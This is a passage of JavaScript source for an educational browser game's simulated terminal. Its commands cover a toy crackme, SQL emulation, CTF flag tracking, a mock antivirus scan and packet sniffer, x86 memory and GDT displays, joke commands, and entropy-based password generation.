        vm.ports.out = (port, v) => { if (port === 1) out += String.fromCharCode(v); };
        vm.load(bin);
        [...rest].slice(0, 0x30).forEach((ch, i) => { vm.mem[CRACKME_INPUT + i] = ch.charCodeAt(0) & 0xff; });
        vm.halted = false;
        let steps = 0;
        while (!vm.halted && steps++ < 5000) { vm.sleep = 0; vm.step(); }
        t.print(`[crackme.bin] input @0x${hex(CRACKME_INPUT)} = "${rest}"  (${steps} instructions)`, c.dim);
        const ok = out.startsWith('ACCESS GRANTED');
        t.print(out.trim() || '(no output)', ok ? c.fg : c.red);
        if (!ok) sys.sound?.('error');
        if (ok) { t.print('*** Cracked! You reversed the XOR-0x5A check. ***', c.purple); sys.onCracked?.(); }
      },
      sql(_, rest) {
        if (!rest) throw new Error("usage: sql SELECT name, lang FROM projects WHERE lang = 'Rust'   (or SHOW TABLES)");
        sys.emit?.('sql');
        formatTable(runSQL(rest)).forEach((l) => t.print(l, l.startsWith('+') ? c.dim : c.fg));
      },
      mongo(_, rest) {
        if (!rest) throw new Error('usage: mongo db.projects.find({lang: "Python"})');
        sys.emit?.('sql');
        const res = runMongo(rest);
        res.forEach((l) => t.print(l, c.fg));
        if (!res.length) t.print('(no documents)', c.dim);
      },
      arm(args) {
        const [b, s, cl] = args.map((x) => parseInt(x, 10) & 0xff);
        if (args.length < 3 || [b, s, cl].some(Number.isNaN)) throw new Error('usage: arm <base 0-255> <shoulder 0-255> <claw 0-255>');
        sys.setArm?.(b, s, cl);
        t.print(`port 0x30 <- ${b}, 0x31 <- ${s}, 0x32 <- ${cl}`, c.amber);
      },
      solder(args) {
        const st = sys.solder?.(args[0]);
        if (!st) throw new Error('soldering station not found');
        t.print(`soldering station: ${st.on ? 'ON' : 'OFF'}  tip ${Math.round(st.temp)} °C  joints ${st.joints}/8`, c.amber);
        if (!args[0]) t.print('usage: solder on | off', c.dim);
      },
      base64(args) {
        const decodeMode = args[0] === '-d' || args[0] === '--decode';
        const arg = decodeMode ? args[1] : args[0];
        if (!arg) throw new Error('usage: base64 [-d] <file|text>');
        let input = arg;
        try { const f = t.findFile(arg).data; input = typeof f === 'string' ? f : dec.decode(f); } catch { /* treat as text */ }
        if (decodeMode) {
          try { t.print(atob(input.trim()), c.amber); } catch { throw new Error('invalid base64 input'); }
        } else t.print(btoa(input), c.amber);
      },
      rot13(_, rest) {
        if (!rest) throw new Error('usage: rot13 <file|text>');
        let input = rest;
        try { const f = t.findFile(rest).data; input = typeof f === 'string' ? f : dec.decode(f); } catch { /* treat as text */ }
        t.print(rot13(input).replace(/\n$/, ''), c.amber);
      },
      submit(_, rest) {
        const guess = rest.trim();
        if (!guess) throw new Error('usage: submit flag{...}');
        const f = FLAGS.find((x) => x.flag === guess);
        if (!f) { t.print('Wrong flag. Keep hunting! (hint: flags)', c.red); sys.sound?.('error'); return; }
        if (t.ctfFound.has(f.id)) { t.print(`Already submitted: ${f.id}`, c.dim); return; }
        t.ctfFound.add(f.id);
        try { localStorage.setItem('engineRoomFlags', JSON.stringify([...t.ctfFound])); } catch { /* ignore */ }
        t.print(`Correct! Flag "${f.id}" captured (${t.ctfFound.size}/${FLAGS.length}).`, c.fg);
        sys.sound?.('coin');
        sys.onFlag?.(t.ctfFound);
      },
      flags() {
        t.print(`CTF progress: ${t.ctfFound.size}/${FLAGS.length}`, c.white);
        FLAGS.forEach((f) => t.print(`  [${t.ctfFound.has(f.id) ? 'x' : ' '}] ${f.id.padEnd(8)} ${t.ctfFound.has(f.id) ? f.flag : 'hint: ' + f.hint}`, t.ctfFound.has(f.id) ? c.fg : c.dim));
      },
      train(args) {
        const r = sys.train?.(args[0] === 'reset');
        if (!r) throw new Error('AI lab offline');
        t.print('AI lab: training a 2-4-1 neural net on XOR (tanh hidden layer, sigmoid output, full-batch gradient descent).', c.cyan);
        t.print('Watch the easel next to the bookshelf. Then try: predict 1 0', c.dim);
      },
      predict(args) {
        const a = Number(args[0]), b = Number(args[1]);
        if (args.length < 2 || [a, b].some(Number.isNaN)) throw new Error('usage: predict <a> <b>   e.g. predict 1 0');
        const out = sys.predict?.(a, b);
        if (out === undefined) throw new Error('AI lab offline');
        t.print(`net(${a}, ${b}) = ${out.toFixed(4)}  ->  ${out > 0.5 ? 1 : 0}   (XOR says ${(a > 0.5) !== (b > 0.5) ? 1 : 0})`, c.amber);
      },
      matrix(_, rest) {
        if (!rest) throw new Error('usage: matrix <text>   (or run matrix.asm to draw with EG-8 ports 0x50/0x51)');
        sys.matrixText?.(rest);
        t.print(`LED matrix: scrolling "${rest.toUpperCase()}"`, c.amber);
      },
      print() {
        const name = sys.startPrint?.();
        t.print(name ? `3D printer: slicing ${name}.stl ... printing (watch the TV cabinet)` : '3D printer: busy, wait for the current print to finish', c.cyan);
      },
      sl() {
        const train = [
          '      ====        ________                ___________',
          '  _D _|  |_______/        \\__I_I_____===__|_________|',
          '   |(_)---  |   H\\________/ |   |        =|___ ___|',
          '   /     |  |   H  |  |     |   |         ||_| |_||',
          '  |      |  |   H  |__--------------------| [___] |',
          '  | ________|___H__/__|_____/[][]~\\_______|       |',
          '  |/ |   |-----------I_____I [][] []  D   |=======|__',
          '__/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__',
          ' |/-=|___|=    ||    ||    ||    |_____/~\\___/',
          '  \\_/      \\O=====O=====O=====O_/      \\_/',
        ];
        t.mode = 'boot';
        const frames = [];
        for (let off = 30; off >= -60; off -= 6) {
          frames.push([() => {
            t.lines.splice(t.lines.length - train.length, train.length);
            train.forEach((l) => t.lines.push({ text: (off > 0 ? ' '.repeat(off) + l : l.slice(-off)).slice(0, t.cols), color: c.white }));
            t.dirty = true;
          }, null, 90]);
        }
        train.forEach(() => t.lines.push({ text: '', color: c.white }));
        t.queueLines([...frames, ['choo choo! (you typed sl instead of ls)', c.dim, 0], [null, null, 0]]);
      },
      cowsay(_, rest) {
        const msg = rest || 'moo. use cowsay <text>';
        const line = '-'.repeat(msg.length + 2);
        [` ${line}`, `< ${msg} >`, ` ${line}`, '        \\   ^__^', '         \\  (oo)\\_______', '            (__)\\       )\\/\\', '                ||----w |', '                ||     ||'].forEach((l) => t.print(l, c.white));
      },
      fortune() {
        const F = [
          'There are 10 kinds of people: those who understand binary and those who do not.',
          'It works on my machine. Then we will ship your machine.',
          'A kernel panic a day keeps the users away.',
          'Weeks of coding can save you hours of planning.',
          'The best way to learn assembly is to write a bootloader at 2 AM.',
          'Real programmers count from 0.',
          'In Rust we trust; in unsafe we verify.',
          '99 little bugs in the code. Take one down, patch it around. 127 little bugs in the code.',
        ];
        t.print(F[Math.floor(Math.random() * F.length)], c.purple);
      },
      cmatrix() {
        t.mode = 'boot';
        const glyphs = '01アイウエオカキクケコ<>/{}#$';
        const items = [];
        for (let i = 0; i < 28; i++) {
          items.push([Array.from({ length: t.cols }, () => (Math.random() < 0.55 ? glyphs[Math.floor(Math.random() * glyphs.length)] : ' ')).join(''), i % 4 ? c.fg : c.white, 60]);
        }
        t.queueLines([...items, ['Wake up, engine...', c.white, 600], ['The Matrix has you. Follow the white rabbit (or just type help).', c.fg, 0], [null, null, 0]]);
      },
      sudo(_, rest) {
        if (/make me a sandwich/.test(rest)) { t.print('Okay. Here is your sandwich: [=====]', c.amber); return; }
        t.print('[sudo] password for engine: ********', c.dim);
        t.print('engine is not in the sudoers file. This incident will be reported (to the cat).', c.red);
      },
      vim() { t.print('You are now trapped in vim. Just kidding: there is no vim here. (Hint for real life: Esc, then :q!)', c.purple); },
      vi() { t.print('vi: see vim. Escape while you still can.', c.purple); },
      nano() { t.print('nano: a friendly editor! Here we use: write <file> (end with a single ".")', c.purple); },
      emacs() { t.print('emacs: great operating system, lacking only a decent editor. Try: write <file>', c.purple); },
      quests() {
        const q = sys.quests?.();
        if (!q) throw new Error('quest system offline');
        t.print(`Quests ${q.done.size}/${q.lines().length}   (press Q outside the terminal for the checklist)`, c.white);
        q.lines().forEach((l) => t.print(l, l.startsWith('[x]') ? c.fg : c.dim));
        const next = q.next();
        if (next) t.print(`next up: ${next[1]}: ${next[2].replace(/`/g, '')}`, c.amber);
      },
      drone() {
        t.print(sys.launchDrone?.() ? '[pad] quadcopter armed... takeoff!' : 'drone: already flying (look up!)', c.cyan);
      },
      make(args) {
        const run = args[0] === 'run';
        t.mode = 'boot';
        sys.onBuild?.(true);
        const L = (text, color = c.fg, d = 160) => [text, color, d];
        t.queueLines([
          L('nasm -f bin boot/boot.asm -o build/boot.bin', c.white, 300),
          L('  boot.bin: 512 bytes, signature 0x55AA at offset 510', c.dim),
          L('cargo build --release --target i686-securerust.json', c.white, 400),
          L('   Compiling core v0.0.0 (sysroot)', c.fg, 350),
          L('   Compiling spin v0.9.8', c.fg, 220),
          L('   Compiling x86 v0.52.0', c.fg, 260),
          L('   Compiling securerust_kernel v0.3.0 (~/projects/SecureRustOS)', c.fg, 600),
          L('    Finished `release` profile [optimized] target(s) in 4.20s', c.cyan, 200),
          L('ld -m elf_i386 -T linker.ld -o build/kernel.elf (entry rust_main @ 0x00100000)', c.white, 220),
          L('dd if=build/boot.bin of=securerust.img conv=notrunc  ->  securerust.img (1.44 MB)', c.white, 260),
          L(run ? 'qemu-system-i386 -drive format=raw,file=securerust.img -serial stdio' : 'build OK. `make run` to boot it.', run ? c.white : c.cyan, 700),
          [() => sys.onBuild?.(false), null, 0],
          run ? [() => { sys.emit?.('make'); sys.sound?.('success'); t.boot(); }, null, 0] : [null, null, 0],
        ]);
      },
      memmap() {
        const rows = [
          ['0x00000-0x003FF', 'Real-mode IVT (interrupt vector table)'],
          ['0x00400-0x004FF', 'BIOS data area'],
          ['0x00500-0x07BFF', 'free (stack lives here at boot)'],
          ['0x07C00-0x07DFF', 'bootloader: the BIOS loads sector 0 here'],
          ['0x07E00-0x7FFFF', 'free conventional memory (GDT @0x7E00 here)'],
          ['0x80000-0x9FFFF', 'EBDA (extended BIOS data area)'],
          ['0xA0000-0xBFFFF', 'video memory (VGA text buffer @0xB8000)'],
          ['0xC0000-0xFFFFF', 'video BIOS, ROMs, system BIOS (reset @0xFFFF0)'],
          ['0x100000+      ', 'extended memory: kernel loaded at 1 MiB (needs A20!)'],
        ];
        t.print('x86 real-mode memory map (also on the whiteboard)', c.white);
        rows.forEach(([a, d]) => t.print(`  ${a}  ${d}`, c.fg));
      },

      // ---- low level
      gdt() {
        const entries = [
          ['null', 0, 0, 0, 0],
          ['kernel code', 0, 0xfffff, 0x9a, 0xc],
          ['kernel data', 0, 0xfffff, 0x92, 0xc],
          ['user code', 0, 0xfffff, 0xfa, 0xc],
          ['user data', 0, 0xfffff, 0xf2, 0xc],
          ['tss', 0x00105000, 0x67, 0x89, 0x0],
        ];
        t.print('sel   name          base       limit  acc  fl  descriptor (hi:lo)', c.white);
        entries.forEach(([name, base, limit, acc, fl], i) => {
          const { lo, hi } = gdtDescriptor(base, limit, acc, fl);
          t.print(`0x${hex(i * 8)}  ${name.padEnd(12)}  0x${hex(base, 8)} ${hex(limit, 5)}  ${hex(acc)}   ${hex(fl, 1)}   ${hex(hi, 8)}:${hex(lo, 8)}`, c.fg);
        });
        t.print(`gdtr: limit=0x${hex(entries.length * 8 - 1, 4)} base=0x00007E00   (lgdt [gdtr])`, c.cyan);
        t.print('access 0x9A = present | ring0 | code | readable.  flags 0xC = 4KiB granularity | 32-bit', c.dim);
      },
      irq() {
        t.print(`IRQ0  timer      ${String(sys.irq.timer).padStart(8)}   (PIT, 100 Hz)`, c.fg);
        t.print(`IRQ1  keyboard   ${String(sys.irq.kbd).padStart(8)}   (every key you press, here and in the room)`, c.fg);
        t.print(`IRQ11 nic0       ${String(sys.irq.nic).padStart(8)}   (packets captured)`, c.fg);
        t.print(`IRQ12 mouse      ${String(sys.irq.mouse).padStart(8)}`, c.fg);
      },
      cpuinfo() {
        t.print(`processor  : 0\nmodel name : EG-8 (EngineGames 8-bit)\nregisters  : ${REGS.join(' ')} PC SP  flags Z C N\nmemory     : 256 bytes, stack @ 0xFF\nclock      : ${sys.getHz()} Hz\nports      : 0x00 leds  0x01 putc  0x02 putnum  0x10 rng  0x20 lamp\nhost       : ${navigator.hardwareConcurrency || '?'} logical cores, ${navigator.platform || 'unknown'}`, c.fg);
      },
      lsdev() {
        t.print('port  device          driver', c.white);
        t.print('0x00  8x LED bar      gpio-leds   (breadboard)', c.fg);
        t.print('0x01  tty0 char out   vga', c.fg);
        t.print('0x02  tty0 num out    vga', c.fg);
        t.print('0x10  optical RNG     optical-rng (lava lamp)', c.fg);
        t.print('0x20  desk lamp       pwm-rgb', c.fg);
      },
      ps() {
        t.print('  PID  STATE  NAME', c.white);
        t.print('    1  S      init', c.fg);
        t.print('    2  S      kworker/optical-rng', c.fg);
        t.print(`    3  ${cpu.halted ? 'S' : 'R'}      eg8-cpu`, c.fg);
        t.print(`    4  ${sys.avThreats() ? 'R' : 'S'}      engine-av`, c.fg);
        t.print('    5  S      enginebuddy', c.fg);
        t.print('    6  R      sh', c.fg);
      },
      hexdump(args) {
        if (!args[0]) throw new Error('usage: hexdump <file>');
        const { data } = t.findFile(args[0]);
        const b = toBytes(data);
        hexdump(b, 256).forEach((l) => t.print(l, c.fg));
        if (b.length > 256) t.print(`... ${b.length - 256} more bytes`, c.dim);
      },

      // ---- security
      async scan() {
        t.print("Engine's Antivirus - scanning /home/engine ...", c.white);
        const found = [];
        let files = 0;
        const walk = (node, path) => {
          for (const [k, v] of Object.entries(node)) {
            const p = [...path, k];
            if (t.isDir(v)) { walk(v, p); continue; }
            files++;
            const b = toBytes(v);
            const sig = SIGNATURES.find((s) => findBytes(b, s.bytes) >= 0);
            const h = shannon(b);
            if (sig) found.push({ p, name: sig.name, h, at: findBytes(b, sig.bytes) });
            else if (h > 7.2 && b.length >= 256) found.push({ p, name: 'Heur.Packed (high entropy)', h, at: -1 });
          }
        };
        walk(t.get(['home', 'engine']), ['home', 'engine']);
        for (const f of found) {
          const where = f.at >= 0 ? ` @ offset 0x${hex(f.at, 4)}` : '';
          t.print(`  [!] ~/${f.p.slice(2).join('/')}  ${f.name}${where}  H=${f.h.toFixed(2)}`, c.red);
          const name = f.p[f.p.length - 1];
          const dir = t.get(f.p.slice(0, -1));
          t.fs.quarantine[name] = dir[name];
          delete dir[name];
        }
        t.print(`${files} files scanned, ${found.length} threats moved to /quarantine`, found.length ? c.amber : c.fg);
        sys.onScan?.(found.length);
      },
      entropy(args) {
        sys.emit?.('entropy');
        const n = Math.min(Math.max(parseInt(args[0] ?? '32', 10) || 32, 1), 256);
        const s = sys.pool.stats;
        const bytes = sys.pool.bytes(n);
        hexdump(bytes, 256).forEach((l) => t.print(l, c.amber));
        const sample = sys.pool.bytes(256);
        t.print(`optical samples=${s.samples} raw bits=${s.rawBits} kept after von Neumann=${s.keptBits} (${(100 * s.keptBits / Math.max(1, s.rawBits)).toFixed(1)}%)`, c.dim);
        t.print(`pool=${sys.pool.pool.length} B   Shannon entropy of 256-byte sample: ${shannon(sample).toFixed(3)} bits/byte (max 8)`, c.cyan);
      },
      async vault(args, rest) {
        if (args[0] === 'gen') {
          const len = Math.min(Math.max(parseInt(args[1] ?? '20', 10) || 20, 8), 64);
          const pw = generatePassword(sys.pool, len);
          sys.emit?.('vault');
          t.print(pw, c.amber);
          t.print(`${len} chars over 94 symbols = ${(len * Math.log2(94)).toFixed(1)} bits of entropy`, c.dim);
        } else if (args[0] === 'hash') {
          const text = rest.replace(/^hash\s*/, '');
          if (!crypto.subtle) throw new Error('WebCrypto needs https or localhost');
          const d = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(text)));
          t.print(`SHA-256("${text}") =`, c.dim);
          t.print(Array.from(d).map((b) => hex(b).toLowerCase()).join(''), c.amber);
        } else t.print('usage: vault gen [len] | vault hash <text>', c.dim);
      },
      nmap() { nmap().forEach((l) => t.print(l, l.startsWith('  ') ? c.fg : c.cyan)); },
      sniff(args) {
        const n = Math.max(1, Math.min(parseInt(args[0] ?? '6', 10) || 6, 30));
        t.print('No.  Proto  Source         Destination    Info', c.white);
        let login = null;
        for (let i = 0; i < n; i++) {
          const f = i === 3 ? loginFrame() : randomFrame();
          const d = decode(f);
          if (d.login) login = f;
          sys.irq.nic++;
          t.print(`${String(i + 1).padStart(3)}  ${d.proto.padEnd(5)}  ${d.src.padEnd(13)}  ${d.dst.padEnd(13)}  ${d.info}${d.ok ? '' : ' [BAD CHECKSUM]'}`, d.login ? c.amber : c.fg);
          if (i === n - 1 && !login) hexdump(f, 48).forEach((l) => t.print('     ' + l, c.dim));
        }
        if (login) { t.print('frame 4 (HTTP POST) in hex:', c.dim); hexdump(login, 256).forEach((l) => t.print('     ' + l, c.dim)); }
        t.print('(last frame shown as hex; IPv4 header checksum verified per RFC 1071)', c.dim);
      },

      // ---- room
      buddy(_, rest) { t.print('EngineBuddy: ' + buddyReply(rest, sys.quests?.()?.next()), c.purple); },
      gpu(args) { const m = sys.setGpuMode(args[0]); t.print(`GPU screen shader: ${m}`, c.cyan); },
      lights() { const on = sys.toggleLights(); t.print(`room lights ${on ? 'on' : 'off'}`, c.cyan); },
    };
  }

  // ---------------------------------------------------------------- frame update / render

  flushOne() {
    const [text, color] = this.queue.shift();
    if (text === null) { this.mode = 'shell'; this.dirty = true; return; }
    if (typeof text === 'function') { text(); return; }
    this.print(text, color);
  }

  update(dt) {
    if (this.queue.length) {
      this.queueTimer -= dt * 1000;
      while (this.queue.length && this.queueTimer <= 0) {
        const delay = this.queue[0][2];
        this.flushOne();
        this.queueTimer += delay;
      }
    }
    this.blink += dt;
    this.statusTimer += dt;
    if (this.statusTimer > 0.25) { this.statusTimer = 0; this.dirty = true; }
    if (this.dirty) { this.render(); this.dirty = false; return true; }
    return false;
  }

  render() {
    const g = this.g;
    const W = this.canvas.width, H = this.canvas.height;
    g.fillStyle = COLORS.bg;
    g.fillRect(0, 0, W, H);
    g.font = `${this.fontSize}px "DejaVu Sans Mono", "Consolas", "Courier New", monospace`;
    g.textBaseline = 'top';

    // status bar
    const cpu = this.sys.cpu;
    g.fillStyle = '#0d2a1c';
    g.fillRect(0, 0, W, 34);
    g.fillStyle = COLORS.fg;
    const state = cpu.halted ? 'HALT' : 'RUN ';
    const now = new Date();
    const status = ` SecureRustOS tty0 | EG-8 ${state} ${this.sys.getHz()}Hz PC=${hex(cpu.pc)} SP=${hex(cpu.sp)} A=${hex(cpu.r[0])} | ${now.toTimeString().slice(0, 8)}`;
    g.fillText(status.slice(0, this.cols + 2), 20, 8);

    // text area
    const showPrompt = this.mode !== 'boot';
    const visible = this.rows - (showPrompt ? 1 : 0);
    const end = this.lines.length - this.scroll;
    const start = Math.max(0, end - visible);
    let y = 46;
    for (let i = start; i < end; i++) {
      const ln = this.lines[i];
      g.fillStyle = ln.color;
      g.shadowColor = ln.color;
      g.shadowBlur = 6;
      g.fillText(ln.text, this.margin, y);
      y += this.lineH;
    }
    g.shadowBlur = 0;
    if (showPrompt && this.scroll === 0) {
      const p = this.promptText();
      let full = p + this.input;
      let offset = 0;
      if (full.length > this.cols - 1) { offset = full.length - (this.cols - 1); full = full.slice(offset); }
      g.fillStyle = COLORS.white;
      g.fillText(full, this.margin, y);
      if (Math.floor(this.blink * 2) % 2 === 0) {
        const cx = this.margin + (p.length + this.cursor - offset) * this.cw;
        g.fillStyle = COLORS.fg;
        g.fillRect(cx, y + 2, this.cw, this.fontSize);
      }
    }
    if (this.scroll > 0) {
      g.fillStyle = COLORS.amber;
      g.fillText(`-- scrollback ${this.scroll} --`, W - 260, H - 30);
    }
  }
}

function regLine(cpu) {
  const r = cpu.r;
  return `A=${hex(r[0])} B=${hex(r[1])} C=${hex(r[2])} D=${hex(r[3])} PC=${hex(cpu.pc)} SP=${hex(cpu.sp)} [${cpu.Z ? 'Z' : '-'}${cpu.C ? 'C' : '-'}${cpu.N ? 'N' : '-'}]`;
}

export function generatePassword(pool, len) {
  const chars = [];
  for (let i = 33; i < 127; i++) chars.push(String.fromCharCode(i)); // 94 printable symbols
  let out = '';
  while (out.length < len) {
    const b = pool.byte();
    if (b < 188) out += chars[b % 94]; // rejection sampling: 188 = 2*94, avoids modulo bias
  }
  return out;
}
